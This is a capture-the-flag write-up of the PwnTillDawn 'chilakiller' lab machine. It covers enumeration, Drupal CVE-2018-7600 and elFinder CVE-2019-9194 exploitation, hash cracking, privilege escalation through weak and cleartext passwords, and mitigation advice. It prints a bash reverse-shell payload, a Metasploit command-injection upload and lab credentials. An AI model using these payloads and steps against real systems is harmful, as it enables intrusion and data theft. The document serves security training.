---
title: "PwnTillDawn - chilakiller"
author: Nasrallah
description: ""
date: 2025-04-23 07:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, medium, metasploit]
img_path: /assets/img/pwntilldawn/chilakiller
image:
    path: chilakiller.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[chilakiller](https://online.pwntilldawn.com/Target/Show/96) from [PwnTillDawn](https://online.pwntilldawn.com/) is running a vulnerable version of elfinder allowing command injection which we exploit to get a shell. After that we exploit a password reuse to elevate to the user, and then we find a clear text password in one of the files that gives us root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.182 (10.150.150.182)                                           
Host is up (0.070s latency).                                                                   
Not shown: 997 closed tcp ports (reset)                                                        
PORT     STATE SERVICE    VERSION                                                              
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)                        
| ssh-hostkey:                                                                                 
|   2048 8e:0a:83:30:6b:a5:ef:12:81:4a:8e:66:c6:f4:22:12 (RSA)                                 
|   256 ef:77:5e:a9:59:19:de:f8:c3:f3:1c:2e:73:09:8a:8f (ECDSA)                                
|_  256 b3:be:3b:05:0c:f7:62:24:ce:1b:5c:5b:df:cc:fc:23 (ED25519)                              
80/tcp   open  http       nginx 1.4.0 (Ubuntu)                                                 
|_http-server-header: nginx 1.4.0 (Ubuntu)                                                     
|_http-title: Welcome to nginx!                                                                
| fingerprint-strings:                                                                         
|   GetRequest:                                                                                
|     HTTP/1.1 200 OK
8080/tcp open  http-proxy nginx 1.4.0 (Ubuntu)
|_http-title: Welcome to nginx!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
```

We found three open ports, 22 running SSH and we have port 80 and 8080 both running nginx.

### Web

We navigate to the website.

![website](1.png)

Both ports display the same default nginx page.

Let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___                          
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                           
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                          
by Ben "epi" Risher 🤓                 ver: 2.11.0                          
───────────────────────────┬──────────────────────                          
 🎯  Target Url            │ http://10.150.150.182                          
 🚀  Threads               │ 50                                             
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt                                                                                                      
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       29w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       25l       69w      612c http://10.150.150.182/     
301      GET        9l       29w      316c http://10.150.150.182/SiteMap => http://10.150.150.182/SiteMap/          
301      GET        9l       29w      314c http://10.150.150.182/Sites => http://10.150.150.182/Sites/          
301      GET        9l       29w      313c http://10.150.150.182/TEMP => http://10.150.150.182/TEMP/          
301      GET        9l       29w      315c http://10.150.150.182/manual => http://10.150.150.182/manual/          
301      GET        9l       29w      320c http://10.150.150.182/restaurante => http://10.150.150.182/restaurante/          
301      GET        9l       29w      318c http://10.150.150.182/test-site => http://10.150.150.182/test-site/          
[####################] - 43s    20483/20483   0s      found:7       errors:36     
[####################] - 42s    20477/20477   482/s   http://10.150.150.182/               
```

We found multiple directories but most of them give us a 403 forbidden when visiting them except `restaurante`

![restaur](2.png)

The site is in spanish, looking at the footer we find that the website is running on `drupal`.

To know the exact version we can visit `http://10.150.150.182/restaurante/CHANGELOG.txt`

```text
Drupal 7.57, 2018-02-21
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.

```

The version is `Drupal 7.57`

## **Foothold**

### Method #1 (Drupal)

Searching on google for exploits in drupal we find [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600), an arbitrary code execution vulnerability.

The exploit I'll be using can be found here : <https://github.com/pimps/CVE-2018-7600>.

Let's test the exploit by running the command id.

```terminal
[★]$ python drupa7-CVE-2018-7600.py http://10.150.150.182/restaurante/ -c id                                                    

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-EWShZVFZATOB9qvRYRXmhNU6Cf89UX92f9mY_35acQY
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It worked! Now let's get a reverse shell by using this payload `bash -c "bash -i >& /dev/tcp/10.66.66.230/9001 0>&1"`.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/new/CVE-2018-7600]
└──╼[★]$ python drupa7-CVE-2018-7600.py http://10.150.150.182/restaurante/ -c 'bash -c "bash -i >& /dev/tcp/10.66.66.230/9001 0>&1"'

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-mQ7rsTUJtkWHz_GeAA51LWq4TOrZS5udnMsgmTXZO9c
[*] Triggering exploit to execute: bash -c "bash -i >& /dev/tcp/10.66.66.230/9001 0>&1"

```

After setting up the listener and running the command we get the shell.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~]
└──╼[★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.66.66.230] from (UNKNOWN) [10.150.150.182] 58148
bash: cannot set terminal process group (781): Inappropriate ioctl for device
bash: no job control in this shell
www-data@chilakiller:/var/www/html/restaurante$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<te$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@chilakiller:/var/www/html/restaurante$ export TERM=xterm
export TERM=xterm
www-data@chilakiller:/var/www/html/restaurante$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                            
┌──[10.66.66.230]─[sirius💀parrot]-[~]
└──╼[★]$ stty raw -echo; fg              
[1]  + continued  nc -lvnp 9001

www-data@chilakiller:/var/www/html/restaurante$
```

### Method #2 (elfinder)

The other directories we find on the website gave us 403 forbidden, but running a recursive scan gives us more results.

```terminal
 ___  ___  __   __     __      __         __   ___                          
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                           
by Ben "epi" Risher 🤓                 ver: 2.11.0                           
───────────────────────────┬──────────────────────                           
 🎯  Target Url            │ http://10.150.150.182                           
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!                                                 
 💥  Timeout (secs)        │ 7       
 🦡  User-Agent            │ feroxbuster/2.11.0                                                
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4                                                                 
───────────────────────────┴──────────────────────                          
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
 😱 no more active scans... exiting
200      GET       25l       69w      612c http://10.150.150.182/
301      GET        9l       29w      316c http://10.150.150.182/SiteMap => http://10.150.150.182/SiteMap/
301      GET        9l       29w      314c http://10.150.150.182/Sites => http://10.150.150.182/Sites/
301      GET        9l       29w      313c http://10.150.150.182/TEMP => http://10.150.150.182/TEMP/
301      GET        9l       29w      326c http://10.150.150.182/TEMP/address_book => http://10.150.150.182/TEMP/address_book/
301      GET        9l       29w      333c http://10.150.150.182/TEMP/address_book/addmin => http://10.150.150.182/TEMP/address_book/addmin/
301      GET        9l       29w      315c http://10.150.150.182/manual => http://10.150.150.182/manual/
301      GET        9l       29w      320c http://10.150.150.182/restaurante => http://10.150.150.182/restaurante/
301      GET        9l       29w      318c http://10.150.150.182/test-site => http://10.150.150.182/test-site/
301      GET        9l       29w      325c http://10.150.150.182/test-site/test-2 => http://10.150.150.182/test-site/test-2/
```

The /test-site/test-2 directory reveals an instance of `elfinder` running on the webpage.

![elfinder](3.png)

The version is `2.1.47`.

After some googling we find that this version is vulnerable to command injection in the PHP connector [CVE-2019-9194](https://nvd.nist.gov/vuln/detail/CVE-2019-9194).

We can find an exploit on metasploit with the name `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`, let's use it and fill in the options.

```terminal
[msf](Jobs:0 Agents:1) >> use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
[*] Using configured payload php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> setg rhosts 10.150.150.182
rhosts => 10.150.150.182
[msf](Jobs:0 Agents:1) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> setg targeturi /test-site/test-2/
targeturi => /test-site/test-2/
[msf](Jobs:0 Agents:1) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> setg lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> run
[*] Started reverse TCP handler on 10.66.66.230:4444 
[*] Uploading payload 'Ju8zmN.jpg;echo 6370202e2e2f66696c65732f4a75387a6d4e2e6a70672a6563686f2a202e6a396749645262796e2e706870 |xxd -r -p |sh& #.jpg' (1953 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/test-site/test-2/php/.j9gIdRbyn.php) ...                               
[*] Sending stage (40004 bytes) to 10.150.150.182
[+] Deleted .j9gIdRbyn.php                                                                     
[*] Meterpreter session 1 opened (10.66.66.230:4444 -> 10.150.150.182:34006) at 2025-04-21 19:00:42 +0100
[*] No reply    
[*] Removing uploaded file ...
[+] Deleted uploaded file                                                                      
                                               
(Meterpreter 1)(/var/www/html/test-site/test-2/php) > getuid
Server username: www-data
```

## **Privilege Escalation**

### www-data -> user1

Drupal has a file at `/var/www/html/restaurante/sites/default/settings.php` that contains credentials for the database that's used for authentication. Let's check that file.

```php

$databases = array (                                                                           
  'default' =>                                                                                 
  array (                                                                                      
    'default' =>                                                                               
    array (                                                                                    
      'database' => 'drupaldb',                                                                
      'username' => 'drupal',                                                                  
      'password' => 'EstaContraNoesTanImp0rtant3!!!',                                          
      'host' => 'localhost',                                                                   
      'port' => '',                                                                            
      'driver' => 'mysql',                                                                     
      'prefix' => 'ptd_',                                                                      
    ),                                                                                         
  ),                                                                                           
);                     
```

We got the password. I tried it with user1 but it didn't work.

Let's connect to the database and see what we can find.

```terminal

www-data@chilakiller:/var/www/html/restaurante/sites/default$ mysql -u drupal -p                                                                                                     [87/1109]
Enter password: ller:/var/www/html/restaurante/sites/default$ mysql -u drupal -p                                                                                                              
Welcome to the MariaDB monitor.  Commands end with ; or \g.                 
Your MariaDB connection id is 68                                            
Server version: 10.1.45-MariaDB-0+deb9u1 Debian 9.12                        
                                                                            
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                                                                                       
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                             
MariaDB [(none)]>                                                           MariaDB [(none)]> show databases;                                                              
+--------------------+                                                      | Database           |                                                                         
+--------------------+                                                      | drupaldb           |                                                                         
| information_schema |             
+--------------------+                         
2 rows in set (0.00 sec)           

MariaDB [(none)]> use drupaldb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [drupaldb]> show tables;
+---------------------------------+
| Tables_in_drupaldb              |
+---------------------------------+
| ptd_actions                     |
| ptd_authmap                     |
[...]
| ptd_users                       |
| ptd_users_roles                 |
| ptd_variable                    |
| ptd_watchdog                    |
+---------------------------------+
76 rows in set (0.00 sec)

MariaDB [drupaldb]> select * from ptd_users;
+-----+---------------+---------------------------------------------------------+-----------------------+-------+-----------+------------------+------------+------------+------------+-------
-+---------------------+----------+---------+-----------------------+------+
| uid | name          | pass                                                    | mail                  | theme | signature | signature_format | created    | access     | login      | status
 | timezone            | language | picture | init                  | data |
+-----+---------------+---------------------------------------------------------+-----------------------+-------+-----------+------------------+------------+------------+------------+-------
-+---------------------+----------+---------+-----------------------+------+
|   0 |               |                                                         |                       |       |           | NULL             |          0 |          0 |          0 |      0
 | NULL                |          |       0 |                       | NULL |
|   1 | administrador | $S$Dobcr9v53WJdz6GsuhauWnwKNTm1pZpId6/rNl6psZwj2prE3d9V | chilakiller@ptd.local |       |           | NULL             | 1596317328 | 1643552710 | 1643551677 |      1
 | America/Mexico_City |          |       0 | chilakiller@ptd.local | b:0; |
+-----+---------------+---------------------------------------------------------+-----------------------+-------+-----------+------------------+------------+------------+------------+-------
-+---------------------+----------+---------+-----------------------+------+
2 rows in set (0.00 sec)

```

We got the hash, let's crack it.

```terminal
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)     
1g 0:00:01:02 DONE (2025-04-21 19:10) 0.01605g/s 318.2p/s 318.2c/s 318.2C/s astro..LOVE1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

It just cracked to `admin`.

After banging my head for hours to find privilege escalation on this box it turned out to be user1 is using the username as a password.

```terminal
www-data@chilakiller:$ su user1
Password: 
user1@chilakiller:$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),117(scanner),1001(ch)
```

### user1 -> root

Running linpaes we find the following information.

```terminal
                                                                            
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                                                       
-rw-r----- 1 root dip 1093 Jul 31  2020 /etc/ppp/peers/provider             
-rw-r----- 1 root ch 29 Aug  1  2020 /etc/openvpn/client/.config/.5OBdDQ80Py
-rw-r----- 1 root dip 656 Jul 31  2020 /etc/chatscripts/provider 
```

There are 3 files that we have permission to read.

The config file of openvpn sounds interesting, let's read it.

```text
user1@chilakiller:~$ cat /etc/openvpn/client/.config/.5OBdDQ80Py
hUqJ2
ChilaKill3s_Tru3_L0v3R
```

We might have just found a password, let's see if it works with user root.

```terminal
user1@chilakiller:~$ su root
Password: 
root@chilakiller:/home/user1# cd
root@chilakiller:~# ls
FLAG2.txt

```

And it did, we got a root shell!

## **Prevention and Mitigation**

### CVE-2018-7600

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.

This vulnerability not only gave us the ability to run command on the system but we were able to use it to get a reverse shell. This would allow an attacker to read, modify and delete all tha data of the website.

How to fix:

- upgrade to the most recent version of drupal
- Apply the patch provided by drupal for the specific version you are using.

### CVE-2019-9194

elFinder before 2.1.48 has a command injection vulnerability in the PHP connector.

- Update to the latest version of elFinder

### Passwords

The password of `user1` is very weak and easy to guess which allowed us to easily escalate our privilege to that user.

The password of root was found in config file in clear text which gave us an easy way to get a root shell.

The drupal administrador password was also weak which allowed us to easily crack it's hash, and it would have been easy to guess it and enter the administrator panel on Drupal

Follow the following practices when creating a password.

- Never use the username as the password, as it's predictable and easily exploited.
- Use long, complex passwords with uppercase, lowercase, numbers, and symbols.
- Never reuse passwords across different accounts to prevent credential stuffing attacks.
- Store passwords in hashed format using strong hashing algorithms.
- Require regular password changes, especially after suspected compromise.
- Avoid hardcoding passwords in code or config files; use environment variables or secrets management tools.

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2018-7600>

<https://nvd.nist.gov/vuln/detail/CVE-2019-9194>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
